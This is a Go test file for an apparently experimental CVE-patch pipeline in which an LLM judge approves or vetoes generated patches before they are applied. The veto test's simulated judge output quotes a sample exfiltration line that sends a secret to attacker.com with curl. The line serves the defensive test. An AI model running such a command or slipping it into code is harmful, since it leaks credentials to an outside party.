package core_test

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"testing"
	"time"

	v1 "gitlab.com/redhat/hummingbird/experimental/factory/core/pkg/api/v1"
	"gitlab.com/redhat/hummingbird/experimental/factory/core/internal/orchestrator"
	"gitlab.com/redhat/hummingbird/experimental/factory/core/internal/pipeline"
	"gitlab.com/redhat/hummingbird/experimental/factory/core/internal/runstore/inmem"
	"gitlab.com/redhat/hummingbird/experimental/factory/core/internal/sandbox"
	"gitlab.com/redhat/hummingbird/experimental/factory/core/internal/verification"
	"github.com/hummingbird-org/factory-workqueue/sdk/go/reconciler"
)

// TestLLMJudge_ApprovedPatch tests LLM judge approving a safe patch.
func TestLLMJudge_ApprovedPatch(t *testing.T) {
	provider, err := sandbox.NewDockerProvider()
	if err != nil {
		t.Skipf("docker not available: %v", err)
	}

	store := inmem.New()
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelInfo}))
	mockEnqueue := &mockEnqueueClient{}

	// Load verified patch pipeline
	loader := pipeline.NewLoader("examples/llm-judge-test/.factory")
	spec, err := loader.Load("verified-patch")
	if err != nil {
		t.Fatalf("load pipeline: %v", err)
	}

	// Create run
	run := &v1.PipelineRun{
		ID:               "llm-judge-" + fmt.Sprint(time.Now().Unix()),
		Phase:            "pending",
		PipelineRepo:     "local",
		PipelinePath:     "verified-patch",
		PipelineCommit:   "test",
		PipelineSpec:     *spec,
		Parameters:       map[string]string{},
		ResourceBindings: map[string]string{},
		Priority:         5,
		CreatedAt:        time.Now(),
		UpdatedAt:        time.Now(),
	}

	if err := store.CreateRun(context.Background(), run); err != nil {
		t.Fatalf("create run: %v", err)
	}

	t.Logf("Created LLM judge test run: %s", run.ID)

	// Setup
	orch := orchestrator.NewReconcilerWithEnqueuer(store, mockEnqueue, logger)
	sandboxMgr := sandbox.NewReconcilerWithEnqueuer(store, provider, mockEnqueue, logger)

	// Create stages
	t.Log("=== Creating stages ===")
	_, err = orch.Reconcile(context.Background(), reconciler.ProcessRequest{
		Key:     "run:" + run.ID,
		Attempt: 1,
	})
	if err != nil {
		t.Fatalf("orchestrator reconcile: %v", err)
	}

	stages, err := store.ListStages(context.Background(), run.ID)
	if err != nil {
		t.Fatalf("list stages: %v", err)
	}

	if len(stages) != 3 {
		t.Fatalf("expected 3 stages, got %d", len(stages))
	}

	// Execute generate-patch stage
	t.Log("=== Executing generate-patch stage ===")
	generateStage := findStageByName(stages, "generate-patch")
	if err := executeStage(t, sandboxMgr, store, generateStage.ID); err != nil {
		t.Fatalf("generate-patch failed: %v", err)
	}

	generateStage, _ = store.GetStage(context.Background(), generateStage.ID)
	if generateStage.Output == nil {
		t.Fatal("generate-patch has no output")
	}

	t.Logf("✓ Generated patch: %v", generateStage.Output)

	// Orchestrator enqueues verify-patch
	t.Log("=== Enqueuing verify-patch stage ===")
	mockEnqueue.enqueued = nil
	_, err = orch.Reconcile(context.Background(), reconciler.ProcessRequest{
		Key:     "run:" + run.ID,
		Attempt: 2,
	})
	if err != nil {
		t.Fatalf("orchestrator reconcile 2: %v", err)
	}

	if len(mockEnqueue.enqueued) != 1 {
		t.Fatalf("expected verify-patch enqueued, got %d", len(mockEnqueue.enqueued))
	}

	// Execute verify-patch stage (LLM judge)
	t.Log("=== Executing LLM judge stage ===")
	verifyStage := findStageByName(stages, "verify-patch")
	if err := executeStage(t, sandboxMgr, store, verifyStage.ID); err != nil {
		t.Fatalf("verify-patch failed: %v", err)
	}

	verifyStage, _ = store.GetStage(context.Background(), verifyStage.ID)
	if verifyStage.Output == nil {
		t.Fatal("verify-patch has no output")
	}

	// Check verdict
	verdict, ok := verifyStage.Output["verdict"]
	if !ok {
		t.Fatal("verify-patch output missing verdict")
	}

	if verdict != "APPROVE" {
		t.Errorf("expected verdict=APPROVE, got: %s", verdict)
	}

	t.Logf("✓ LLM judge verdict: %s", verdict)
	t.Logf("✓ Reasoning: %s", verifyStage.Output["reasoning"])

	// Run verification gate on judgment output
	t.Log("=== Running verification gate ===")
	judge := verification.NewLLMJudge("security-judge", verification.DefaultSecurityCriteria())
	if err := judge.Check(context.Background(), verifyStage); err != nil {
		t.Errorf("verification gate failed: %v", err)
	}

	t.Log("✓ Verification gate passed")

	// Orchestrator enqueues apply-patch
	t.Log("=== Enqueuing apply-patch stage ===")
	mockEnqueue.enqueued = nil
	_, err = orch.Reconcile(context.Background(), reconciler.ProcessRequest{
		Key:     "run:" + run.ID,
		Attempt: 3,
	})
	if err != nil {
		t.Fatalf("orchestrator reconcile 3: %v", err)
	}

	if len(mockEnqueue.enqueued) != 1 {
		t.Fatalf("expected apply-patch enqueued, got %d", len(mockEnqueue.enqueued))
	}

	// Execute apply-patch stage
	t.Log("=== Executing apply-patch stage ===")
	applyStage := findStageByName(stages, "apply-patch")
	if err := executeStage(t, sandboxMgr, store, applyStage.ID); err != nil {
		t.Fatalf("apply-patch failed: %v", err)
	}

	applyStage, _ = store.GetStage(context.Background(), applyStage.ID)
	if applyStage.Output == nil {
		t.Fatal("apply-patch has no output")
	}

	status := applyStage.Output["status"]
	if status != "success" {
		t.Errorf("expected status=success, got: %s", status)
	}

	t.Logf("✓ Patch applied: %v", applyStage.Output)

	// Mark run complete
	t.Log("=== Completing pipeline ===")
	_, err = orch.Reconcile(context.Background(), reconciler.ProcessRequest{
		Key:     "run:" + run.ID,
		Attempt: 4,
	})
	if err != nil {
		t.Fatalf("orchestrator reconcile 4: %v", err)
	}

	run, _ = store.GetRun(context.Background(), run.ID)
	if run.Phase != "succeeded" {
		t.Errorf("expected run succeeded, got: %s", run.Phase)
	}

	t.Log("=== LLM JUDGE TEST SUMMARY ===")
	t.Log("✓ Generate-patch: created CVE fix")
	t.Log("✓ Verify-patch: LLM judge approved (safe patch)")
	t.Log("✓ Apply-patch: patch applied after approval")
	t.Log("✓ LLM-AS-JUDGE VERIFICATION WORKING")
}

// TestLLMJudge_BuildPrompt tests prompt construction.
func TestLLMJudge_BuildPrompt(t *testing.T) {
	judge := verification.NewLLMJudge("security-judge", verification.DefaultSecurityCriteria())

	task := "Fix CVE-2026-1234: buffer overflow in SSL handshake"
	generatedOutput := `{
		"type": "patch",
		"diff": "--- a/src/ssl.c\n+++ b/src/ssl.c\n..."
	}`

	prompt := judge.BuildPrompt(task, generatedOutput)

	// Check prompt contains key elements
	if len(prompt) < 100 {
		t.Error("prompt too short")
	}

	requiredElements := []string{
		"SECURITY-CRITICAL REVIEW",
		"Original Task:",
		"Generated Output:",
		"addresses_task",
		"no_malicious_code",
		"no_scope_creep",
		"APPROVE",
		"VETO",
		"UNCERTAIN",
		"JSON format",
	}

	for _, elem := range requiredElements {
		if !contains(prompt, elem) {
			t.Errorf("prompt missing required element: %s", elem)
		}
	}

	t.Logf("✓ Prompt template contains all required elements")
	t.Logf("✓ Prompt length: %d chars", len(prompt))
}

// TestLLMJudge_VetoMaliciousPatch tests rejecting malicious output.
func TestLLMJudge_VetoMaliciousPatch(t *testing.T) {
	judge := verification.NewLLMJudge("security-judge", verification.DefaultSecurityCriteria())

	// Simulate stage with VETO verdict
	stage := &v1.StageRun{
		ID:        "stage-veto",
		StageName: "verify-malicious",
		Phase:     "succeeded",
		Output: map[string]interface{}{
			"type":      "verification",
			"verdict":   "VETO",
			"reasoning": "Detected malicious code: system call to external service for data exfiltration (curl attacker.com)",
			"criteria_results": map[string]interface{}{
				"no_malicious_code": map[string]interface{}{
					"pass":     false,
					"evidence": "Line 43: system(\"curl attacker.com/exfil?data=\" + secret)",
					"severity": "critical",
				},
			},
		},
	}

	// Verification gate should fail
	err := judge.Check(context.Background(), stage)
	if err == nil {
		t.Fatal("expected verification gate to fail on VETO, got nil")
	}

	if !contains(err.Error(), "vetoed") {
		t.Errorf("expected error to mention veto, got: %v", err)
	}

	t.Logf("✓ LLM judge correctly vetoed malicious output")
	t.Logf("✓ Error: %v", err)
}

// TestLLMJudge_UncertainDefaultsToVeto tests fail-safe behavior.
func TestLLMJudge_UncertainDefaultsToVeto(t *testing.T) {
	judge := verification.NewLLMJudge("security-judge", verification.DefaultSecurityCriteria())

	// Simulate stage with UNCERTAIN verdict
	stage := &v1.StageRun{
		ID:        "stage-uncertain",
		StageName: "verify-uncertain",
		Phase:     "succeeded",
		Output: map[string]interface{}{
			"type":      "verification",
			"verdict":   "UNCERTAIN",
			"reasoning": "Insufficient information to determine if obfuscated code is malicious or legitimate compression",
		},
	}

	// Verification gate should fail (fail-safe)
	err := judge.Check(context.Background(), stage)
	if err == nil {
		t.Fatal("expected verification gate to fail on UNCERTAIN, got nil")
	}

	if !contains(err.Error(), "uncertain") && !contains(err.Error(), "veto") {
		t.Errorf("expected error about uncertainty/veto, got: %v", err)
	}

	t.Logf("✓ LLM judge correctly treats UNCERTAIN as veto (fail-safe)")
	t.Logf("✓ Error: %v", err)
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && findSubstring(s, substr))
}

func findSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
